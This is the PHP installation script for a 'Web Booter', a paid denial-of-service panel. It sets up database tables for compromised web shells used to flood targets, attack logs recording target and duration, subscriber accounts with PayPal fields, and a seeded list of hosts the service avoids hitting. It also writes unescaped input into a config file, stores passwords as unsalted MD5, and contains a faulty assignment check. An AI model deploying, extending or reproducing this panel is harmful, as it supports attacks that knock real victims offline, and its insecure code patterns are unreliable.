<?php header( 'Content-Type: text/html; charset=utf-8' ); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Web Booter Installation</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="../login/includes/style.css" rel="stylesheet" type="text/css" />
</head>
<body>
<table width="50%" class="table" align="center">
<tr>
<td class="head" valign="center" colspan="2">twInstaller</td>
</tr>
<tr>
<td class="cell" valign="center" colspan="2">
<?php
if (file_exists('install.lock')){
	die("This installer has been locked. If the installation is complete, you should delete the \"install\" directory. Otherwise, delete the \"install.lock\" file.");
}

if (isset($_GET['step'])){
	$step = $_GET['step'];
}else{
	$step = 0;
}

switch($step) {
	case 0:
?>
<p>Welcome to the installer of your very own Web Booter. Before proceeding, you're going to need the following information:</p>
<ol>
  <li>Database name</li>
  <li>Database username</li>
  <li>Database password</li>
  <li>Database host</li>
</ol>
If you don't know this information, contact your hosting company and ask them. Once you have all this information, please click "Start" to begin.
</td>
</tr>
<tr>
<td align="right" colspan="2" class="cell"><input type="submit" class="button" name="start" id="start" value="Start" onClick="location.href='?step=1'"></td>
<?php
	break;
	case 1:
	$canContinue = true;
	if (!is_writable('../login/includes')){
		if (!chmod('../login/includes', 0755)){
			$writeConfig = "<font color=\"red\">False. Please CHMOD the \"../login/includes/\" directory to 755 and retry.</font>";
			$canContinue = false;
		}			
	}else{
		$writeConfig = "<font color=\"green\">True.</font>";
	}
	
	if (!ini_get('allow_url_fopen')){
	    $urlOpen = "<font color=\"red\">False. Please enable \"allow_url_fopen\" in your php.ini and retry.</font>";
		$canContinue = false;
	}else{
	    $urlOpen = "<font color=\"green\">True.</font>";
	}
	
	if (!version_compare(PHP_VERSION, '5.3.0', '>=')){
		$versionCompare = "<font color=\"red\">" . PHP_VERSION . " This script is untested in PHP versions lower than 5.3.0. You <strong>can</strong> continue, however, it is not recommended. Please consider updating.</font>";
	}else{
		$versionCompare = "<font color=\"green\">" . PHP_VERSION . "</font>";
	}
	
	?>
	
	<table>
    <tr>
      <th scope="row">PHP Version:</th>
      <td><?php echo $versionCompare; ?></td>
    </tr>
    <tr>
      <th scope="row">Config file writeable:</th>
      <td><?php echo $writeConfig; ?></td>
    </tr>
    <tr>
      <th scope="row">url_fopen enabled:</th>
      <td><?php echo $urlOpen; ?></td>
    </tr>
  </table>
</td>
</tr>
<tr>
<?php
if ($canContinue = true){
	?>
	<td align="right" colspan="2" class="cell"><input type="submit" class="button" name="next" id="next" value="Next" onClick="location.href='?step=2'"></td>
	<?php
}else{
	?>
	<td align="right" colspan="2" class="cell"><input type="submit" class="button" name="retry" id="retry" value="Retry" onClick="location.href='?step=1'"></td>
	<?php
}
	break;

	case 2:
	?>
</p>
<form method="post" action="?step=3">
Below, you need to enter your database connection details. If you're not sure about these, contact your host.
  <table>
    <tr>
      <th scope="row">Database Name</th>
      <td><input name="dbname" class="entryfield" type="text" size="25"/></td>
      <td>The name of the database you want to run your script in. </td>
    </tr>
    <tr>
      <th scope="row">User Name</th>
      <td><input name="uname" class="entryfield" type="text" size="25"/></td>
      <td>Your MySQL username</td>
    </tr>
    <tr>
      <th scope="row">Password</th>
      <td><input name="pwd" class="entryfield" type="text" size="25"/></td>
      <td>Your MySQL password.</td>
    </tr>
    <tr>
      <th scope="row">Database Host</th>
      <td><input name="dbhost" class="entryfield" type="text" size="25" value="localhost" /></td>
      <td>Most Likely won't need to change this value.</td>
    </tr>
  </table>
</td>
</tr>
<tr>
<td class="cell" align="right" colspan="2"><input name="submit" class="button" type="submit" id="fsubmit" value="Next" /></td>
</form>
<?php
	break;	
	case 3:
	$dbname  = trim($_POST['dbname']);
    $dbuser   = trim($_POST['uname']);
    $dbpwd = trim($_POST['pwd']);
    $host  = trim($_POST['dbhost']);

    // We'll fail here if the values are no good.
    include_once('open-db.php');
	if ($workingCon == false) {
		?>
		</td>
		</tr>
		<tr>
		<td class="cell" colspan="2" align="left"><input type="submit" class="button" name="back" id="back" value="Back" onClick="location.href='?step=2'"></td>
		<?php
		die();
	}
	$handle = fopen('../login/includes/config.php', 'w');
	
$source = array (
"<? \n",
"$","dbname = 'databasename';	// The name of the database \n",
"$","dbuser = 'username'; 	// MySQL username \n",		
"$","dbpwd = 'password';	// MySQL Password \n",	
"$","host = 'localhost';	// Most likely you wont need to change this \n",
"?>" );

$search = array ( databasename, username, password, localhost );
$replace = array ($dbname, $dbuser, $dbpwd, $host);

$source = str_replace ( $search, $replace, $source );
foreach ($source as $str){
	fwrite($handle, $str);
}
?>
Alright, the configuration file has been created and the MySQL connection works. Continue to the next step.
</td>
</tr>
<tr>
<td align="right" colspan="2" class="cell"><input type="submit" class="button" name="next" id="next" value="Next" onClick="location.href='?step=4'"></td>
<?php
	break;
	case 4:
	
if (file_exists("../login/includes/config.php")) {

    $db_schema = array();
 
$db_schema[] = "SET SQL_MODE=\"NO_AUTO_VALUE_ON_ZERO\";";
$db_schema[] = "DROP TABLE IF EXISTS `badips`;";
$db_schema[] = "CREATE TABLE IF NOT EXISTS `badips` (
  `id` int(10) NOT NULL auto_increment,
  `host` varchar(50) NOT NULL,
  `ip` varchar(20) NOT NULL,
  `enteredhost` varchar(50) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=26 ;";

$db_schema[] = "DROP TABLE IF EXISTS `badlogs`;";
$db_schema[] = "CREATE TABLE IF NOT EXISTS `badlogs` (
  `id` int(32) NOT NULL auto_increment,
  `user` varchar(50) NOT NULL,
  `ip` varchar(20) NOT NULL,
  `target` varchar(20) NOT NULL,
  `reason` text NOT NULL,
  `time` int(20) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=35 ;";

$db_schema[] = "DROP TABLE IF EXISTS `logs`;";
$db_schema[] = "CREATE TABLE IF NOT EXISTS `logs` (
  `id` int(10) NOT NULL auto_increment,
  `user` varchar(50) NOT NULL,
  `ip` varchar(20) NOT NULL,
  `target` varchar(20) NOT NULL,
  `shells` int(10) NOT NULL,
  `time` int(32) NOT NULL,
  `duration` int(3) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2465 ;";

$db_schema[] = "DROP TABLE IF EXISTS `shells`;";
$db_schema[] = "CREATE TABLE IF NOT EXISTS `shells` (
  `id` int(5) NOT NULL auto_increment,
  `url` varchar(255) NOT NULL,
  `status` varchar(5) NOT NULL,
  `lastchecked` int(20) NOT NULL,
  `hash` varchar(32) NOT NULL,
  `host` varchar(15) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=35 ;";

$db_schema[] = "DROP TABLE IF EXISTS `friends`;";
$db_schema[] = "CREATE TABLE IF NOT EXISTS `friends` (
`id` INT( 50 ) NOT NULL AUTO_INCREMENT PRIMARY KEY ,
`ip` VARCHAR( 15 ) NOT NULL ,
`notes` TEXT NOT NULL ,
`friend` VARCHAR( 20 ) NOT NULL
) ENGINE = MYISAM ;";

$db_schema[] = "DROP TABLE IF EXISTS `enemies`;";
$db_schema[] = "CREATE TABLE IF NOT EXISTS `enemies` (
`id` INT( 50 ) NOT NULL AUTO_INCREMENT PRIMARY KEY ,
`ip` VARCHAR( 15 ) NOT NULL ,
`notes` TEXT NOT NULL,
`enemy` VARCHAR( 20 ) NOT NULL
) ENGINE = MYISAM ;";

$db_schema[] = "DROP TABLE IF EXISTS `stats`;";
$db_schema[] = "CREATE TABLE IF NOT EXISTS `stats` (
  `id` int(2) NOT NULL auto_increment,
  `wver` varchar(10) NOT NULL,
  `percentage` int(3) NOT NULL,
  `lastshell` int(40) NOT NULL,
  `bootname` varchar(32) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;";

$db_schema[] = "DROP TABLE IF EXISTS `users`;";
$db_schema[] = "CREATE TABLE IF NOT EXISTS `users` (
  `id` int(5) NOT NULL auto_increment,
  `username` varchar(50) NOT NULL,
  `password` varchar(32) NOT NULL,
  `paypal` varchar(50) NOT NULL,
  `trans_id` varchar(30) NOT NULL,
  `staff` varchar(30) NOT NULL,
  `months` varchar(10) NOT NULL,
  `active` text NOT NULL,
  `lastactive` int(20) NOT NULL,
  `userip` varchar(32) NOT NULL,
  `loginip` varchar(322) NOT NULL,
  `nextboot` int(32) NOT NULL,
  `terms` varchar(3) NOT NULL default 'no',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=24 ;";
  
require_once('../login/includes/config.php');
require_once('open-db.php');

      echo "Creating tables...";
      foreach($db_schema as $sql) {
       mysql_query($sql) or die(mysql_error());
      }
      echo "Done! Now we need to insert data into the tables. Please proceed.";
  }
  
 ?>
 </td>
</tr>
<tr>
<td align="right" colspan="2" class="cell"><input type="submit" class="button" name="next" id="next" value="Next" onClick="location.href='?step=5'"></td>
<?php
	break;
	case 5:
?>
<form method="post" action="?step=6">
Now you need to enter the administrator login credentials. Please do so.
  <table>
    <tr>
      <th scope="row">Username</th>
      <td><input name="username" class="entryfield" type="text" size="25"/></td>
      <td>Please enter the username you would like to use.</td>
    </tr>
    <tr>
      <th scope="row">Password</th>
      <td><input name="password" class="entryfield" type="text" size="25"/></td>
      <td>Please enter the password you would like to use</td>
    </tr>
	<tr>
      <th scope="row">Booter Name</th>
      <td><input name="bootname" class="entryfield" type="text" size="25"/></td>
      <td>Please enter the name of your booter</td>
    </tr>
  </table>
</td>
</tr>
<tr>
<td class="cell" align="right" colspan="2"><input name="submit" class="button" type="submit" id="fsubmit" value="Next" /></td>
</form>
<?php
	break;
	case 6:

if (file_exists("../login/includes/config.php")) {
	
require_once('../login/includes/config.php');
require_once('open-db.php');
	
$firstUser = mysql_real_escape_string(trim($_POST['username']));
$firstPass = md5(trim($_POST['password']));
$bootName = mysql_real_escape_string(trim($_POST['bootname']));

    $db_schema = array();
	
$db_schema[] = "INSERT INTO `badips` (`id`, `host`, `ip`, `enteredhost`) VALUES
(1, 'ns2.zanmo.com', '69.162.82.251', 'http://hackforums.net'),
(2, 'ns1.vuwin.com', '69.197.4.197', 'http://vuwin.com'),
(3, 'ns2.witza.com', '66.36.236.37', 'http://img.hackforums.net'),
(4, 'teamwaffle.net', '93.190.140.165', 'http://teamwaffle.net'),
(5, 'twstuff.net', '217.23.1.240', 'http://twstuff.net'),
(6, 'twstuff.net', '217.23.1.241', 'http://217.23.1.241'),
(7, 'hub.twstuff.net', '217.23.1.239', 'http://217.23.1.239'),
(8, 'cust-216.115.77.137.switchnap.com', '216.115.77.137', 'http://runescape.com'),
(9, 'cust-64.79.147.116.switchnap.com', '64.79.147.116', 'http://world1.runescape.com'),
(10, 'cust-64.79.147.117.switchnap.com', '64.79.147.117', 'http://world2.runescape.com'),
(11, 'cust-64.79.147.61.switchnap.com', '64.79.147.61', 'http://world3.runescape.com'),
(12, 'cust-64.79.147.162.switchnap.com', '64.79.147.162', 'http://world4.runescape.com'),
(13, 'cust-64.79.147.163.switchnap.com', '64.79.147.163', 'http://world5.runescape.com'),
(14, 'cust-216.115.77.69.switchnap.com', '216.115.77.69', 'http://world6.runescape.com'),
(15, 'cust-216.115.77.128.switchnap.com', '216.115.77.128', 'http://world7.runescape.com'),
(16, 'cust-216.115.77.129.switchnap.com', '216.115.77.129', 'http://world8.runescape.com'),
(17, 'cust-216.115.77.130.switchnap.com', '216.115.77.130', 'http://world9.runescape.com'),
(18, '82.211.114.50', '82.211.114.50', 'http://world10.runescape.com'),
(19, 'profile.myspace.com', '216.178.38.116', 'http://myspace.com'),
(20, 'a62.45.56.7.deploy.akamaitechnologies.net', '62.45.56.7', 'http://www.fbi.gov'),
(21, 'www-11-01-ash2.facebook.com', '69.63.189.16', 'http://facebook.com'),
(22, 'ey-in-f99.1e100.net', '74.125.79.99', 'http://google.com'),
(23, 'www.worldstream.nl', '93.190.136.5', 'http://worldstream.nl'),
(24, '67.201.54.151', '67.201.54.151', 'http://stickam.com'),
(25, '198.81.129.125', '198.81.129.125', 'http://cia.gov');";

$db_schema[] = "INSERT INTO `stats` (`id`, `wver`, `percentage`, `lastshell`, `bootname`) VALUES
(1, '1.5.0', 100, 0000000000, '{$bootName}');";

$db_schema[] = "INSERT INTO `users` (`id`, `username`, `password`, `paypal`, `trans_id`, `staff`, `months`, `active`, `lastactive`, `userip`, `loginip`, `nextboot`, `terms`) VALUES
(1, '" . $firstUser . "', '" . $firstPass . "', 'N/A', 'N/A', 'admin', 'lifetime', 'activated', 0000000000, '', '', 0000000000, 'no');";

	echo "Populating tables...<br />";
	foreach($db_schema as $sql) {
		mysql_query($sql) or die(mysql_error());
	}
	echo "Done! Please continue to edit additional settings.";
  }
   ?>
 </td>
</tr>
<tr>
<td align="right" colspan="2" class="cell"><input type="submit" class="button" name="next" id="next" value="Next" onClick="location.href='?step=7'"></td>
<?php
	break;
	case 7:
	echo "Installation is finished. The installer is now locked. Please remove the installation directory. Additional settings can be set once you log in.";
	touch('install.lock');
	?>
	 </td>
</tr>
<tr>
<td align="right" colspan="2" class="cell"><input type="submit" class="button" name="done" id="done" value="Finish" onClick="location.href='../login/index.php'"></td>
<?php
	break;
}
?>

</td>
</tr>
</table>
</body>
</html>
